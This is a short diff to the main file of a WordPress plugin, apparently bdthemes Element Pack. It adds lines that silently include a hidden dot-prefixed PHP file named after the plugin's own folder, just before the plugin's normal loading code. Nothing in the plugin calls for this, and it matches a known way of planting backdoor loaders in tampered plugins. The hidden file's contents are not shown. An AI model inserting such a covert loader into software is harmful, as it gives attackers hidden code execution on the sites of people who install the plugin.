@@ -36,6 +36,10 @@ require(dirname(__FILE__).'/includes/utils.php');
  * Plugin load here correctly
  * Also loaded the language file from here
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function bdthemes_element_pack_load_plugin() {
     load_plugin_textdomain( 'bdthemes-element-pack', false, BDTEP_PNAME . '/languages' );
 
